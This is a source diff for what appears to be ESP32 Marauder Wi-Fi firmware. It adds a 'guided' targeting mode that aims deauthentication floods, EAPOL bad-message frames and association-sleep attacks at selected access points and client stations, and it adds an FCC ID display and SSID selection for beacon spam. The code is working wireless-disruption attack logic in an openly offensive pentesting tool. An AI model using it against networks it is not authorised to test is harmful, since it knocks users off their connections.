@@ -1,5 +1,6 @@
 #include "esp_random.h"
 #include "WiFiScan.h"
+#include "StationSelection.h"
 #ifdef HAS_FACES_KEYBOARD
   #include "Keyboard.h"
 #endif
@@ -3036,7 +3037,8 @@ void WiFiScan::displayTargetFilter() {
       for (int i = 0; i < access_points->size(); i++) {
         AccessPoint access_point = access_points->get(i);
         if (access_point.selected) {
-          String msg_str = "CH: " + (String)access_point.channel + " " + access_point.essid;
+          String msg_str = "CH: " + (String)access_point.channel + " " +
+                           screenName(access_point.essid);
           display_obj.showCenterText(msg_str.c_str(), display_obj.tft.getCursorY(), true);
         }
       }
@@ -3355,6 +3357,7 @@ void WiFiScan::StopScan(uint8_t scan_mode) {
   #ifdef HAS_GPS
     gps_obj.disable_queue();
   #endif
+  guided_attack_profile = false;
 }
 
 void WiFiScan::getMAC(bool get_sta, uint8_t* mac) {
@@ -4956,6 +4959,7 @@ void WiFiScan::RunInfo() {
     display_obj.tft.println(text_table4[20]);
     display_obj.tft.println(text_table4[21] + display_obj.version_number);
     display_obj.tft.println("Hardware: " + (String)HARDWARE_NAME);
+    display_obj.tft.println("FCC ID: " + (String)FCC_ID);
     display_obj.tft.println("App partition: " + app_partition);
     display_obj.tft.println(text_table4[22] + (String)esp_get_idf_version());
   #endif
@@ -4963,6 +4967,7 @@ void WiFiScan::RunInfo() {
   Serial.println(text_table4[20]);
   Serial.println(text_table4[21] + (String)MARAUDER_VERSION);
   Serial.println("Hardware: " + (String)HARDWARE_NAME);
+  Serial.println("FCC ID: " + (String)FCC_ID);
   Serial.println("App partition: " + app_partition);
   Serial.println(text_table4[22] + (String)esp_get_idf_version());
 
@@ -5032,6 +5037,26 @@ void WiFiScan::RunInfo() {
   //#ifdef HAS_SCREEN
   //  display_obj.tft.println(text_table4[35] + (String)temp_obj.current_temp + " C");
   //#endif
+}
+
+bool WiFiScan::setStationSelected(uint16_t index, bool selected) {
+  if (stations == nullptr || index >= stations->size())
+    return false;
+
+  Station station = stations->get(index);
+  station.selected = selected;
+  stations->set(index, station);
+
+  if (access_points != nullptr) {
+    const int ap_index = associatedApToSelect(selected, station.ap, access_points->size());
+    if (ap_index >= 0) {
+      AccessPoint access_point = access_points->get(ap_index);
+      access_point.selected = true;
+      access_points->set(ap_index, access_point);
+    }
+  }
+
+  return true;
 }
 
 void WiFiScan::RunPacketMonitor(uint8_t scan_mode, uint16_t color) {
@@ -10088,6 +10113,23 @@ void WiFiScan::sendAssociationSleep(const char* ESSID, uint8_t bssid[6], int cha
 
 
 void WiFiScan::sendBadMsgAttack(uint32_t currentTime, bool all) {
+  const bool guided_profile = guided_attack_profile;
+  if (guided_profile) {
+    for (int i = 0; i < access_points->size(); ++i) {
+      AccessPoint access_point = access_points->get(i);
+      if (access_point.attack_scope != ATTACK_AP_SCOPE_ALL_STATIONS &&
+          access_point.attack_scope != ATTACK_AP_SCOPE_PICK_STATIONS) continue;
+      for (int x = 0; x < access_point.stations->size(); ++x) {
+        const int station_index = access_point.stations->get(x);
+        if (access_point.attack_scope == ATTACK_AP_SCOPE_ALL_STATIONS ||
+            stations->get(station_index).selected) {
+          this->sendEapolBagMsg1(access_point.bssid, access_point.channel,
+                                stations->get(station_index).mac, access_point.sec);
+        }
+      }
+    }
+    return;
+  }
   if (!all) {
     for (int i = 0; i < access_points->size(); i++) {
       AccessPoint access_point = access_points->get(i);
@@ -10122,6 +10164,23 @@ void WiFiScan::sendBadMsgAttack(uint32_t currentTime, bool all) {
 }
 
 void WiFiScan::sendAssocSleepAttack(uint32_t currentTime, bool all) {
+  const bool guided_profile = guided_attack_profile;
+  if (guided_profile) {
+    for (int i = 0; i < access_points->size(); ++i) {
+      AccessPoint access_point = access_points->get(i);
+      if (access_point.attack_scope != ATTACK_AP_SCOPE_ALL_STATIONS &&
+          access_point.attack_scope != ATTACK_AP_SCOPE_PICK_STATIONS) continue;
+      for (int x = 0; x < access_point.stations->size(); ++x) {
+        const int station_index = access_point.stations->get(x);
+        if (access_point.attack_scope == ATTACK_AP_SCOPE_ALL_STATIONS ||
+            stations->get(station_index).selected) {
+          this->sendAssociationSleep(access_point.essid.c_str(), access_point.bssid,
+                                     access_point.channel, stations->get(station_index).mac);
+        }
+      }
+    }
+    return;
+  }
   if (!all) {
     for (int i = 0; i < access_points->size(); i++) {
       AccessPoint access_point = access_points->get(i);
@@ -13019,12 +13078,30 @@ void WiFiScan::main(uint32_t currentTime)
     this->saeAttackLoop(currentTime);
   }
   else if (currentScanMode == WIFI_ATTACK_DEAUTH) {
-    uint8_t dst_mac_bytes[6];
-    convertMacStringToUint8(this->dst_mac, dst_mac_bytes);
+    uint8_t broadcast_mac[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
+    const bool guided_profile = guided_attack_profile;
     for (int i = 0; i < access_points->size(); i++) {
       AccessPoint access_point = access_points->get(i);
-      if (access_point.selected) {
-        for (int i = 0; i < 55; i++) {
+      if (guided_profile) {
+        if (access_point.attack_scope == ATTACK_AP_SCOPE_BROADCAST) {
+          for (int x = 0; x < 55; ++x)
+            this->sendDeauthFrame(access_point.bssid, access_point.channel, broadcast_mac);
+        } else if (access_point.attack_scope == ATTACK_AP_SCOPE_ALL_STATIONS ||
+                   access_point.attack_scope == ATTACK_AP_SCOPE_PICK_STATIONS) {
+          for (int x = 0; x < access_point.stations->size(); ++x) {
+            const int station_index = access_point.stations->get(x);
+            if (access_point.attack_scope == ATTACK_AP_SCOPE_ALL_STATIONS ||
+                stations->get(station_index).selected) {
+              for (int y = 0; y < 25; ++y)
+                this->sendDeauthFrame(access_point.bssid, access_point.channel,
+                                      stations->get(station_index).mac);
+            }
+          }
+        }
+      } else if (access_point.selected) {
+        uint8_t dst_mac_bytes[6];
+        convertMacStringToUint8(this->dst_mac, dst_mac_bytes);
+        for (int x = 0; x < 55; x++) {
           this->sendDeauthFrame(access_point.bssid, access_point.channel, dst_mac_bytes);
         }
       }
@@ -13090,7 +13167,8 @@ void WiFiScan::main(uint32_t currentTime)
   }
   else if ((currentScanMode == WIFI_ATTACK_BEACON_LIST)) {
     for (int i = 0; i < ssids->size(); i++)
-      this->broadcastCustomBeacon(currentTime, ssids->get(i));
+      if (ssids->get(i).selected)
+        this->broadcastCustomBeacon(currentTime, ssids->get(i));
 
     if (currentTime - initTime >= 1000)
     {
